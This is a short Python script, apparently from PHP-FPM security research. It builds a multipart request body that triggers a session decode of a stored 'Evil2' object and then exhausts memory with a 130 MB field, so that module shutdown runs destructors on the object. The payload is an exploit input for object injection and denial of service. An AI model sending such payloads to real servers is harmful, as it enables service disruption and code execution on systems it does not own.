#!/usr/bin/env python3
"""Startup-OOM multipart for the FPM module-shutdown destructor test.

Order matters: progress field first creates the upload-progress context; the
file part's FILE_START runs the pre-RINIT session decode (stored Evil2 object);
the final 130 MB field then OOMs request startup so FPM takes the
php_module_shutdown() path with the object still in $_SESSION.

Usage: mk_destruct_a.py <out> [big_bytes]
"""
import sys

out = sys.argv[1]
size = int(sys.argv[2]) if len(sys.argv) > 2 else 130_000_000
B = b"----p2sd"
body = (
    b"--" + B + b"\r\n"
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
    b"--" + B + b"\r\n"
    b'Content-Disposition: form-data; name="f"; filename="t"\r\n'
    b"Content-Type: application/octet-stream\r\n\r\nZ\r\n"
    b"--" + B + b"\r\n"
    b'Content-Disposition: form-data; name="big"\r\n\r\n'
    + b"B" * size + b"\r\n"
    b"--" + B + b"--\r\n"
)
with open(out, "wb") as fh:
    fh.write(body)
print("body=%d big=%d" % (len(body), size))
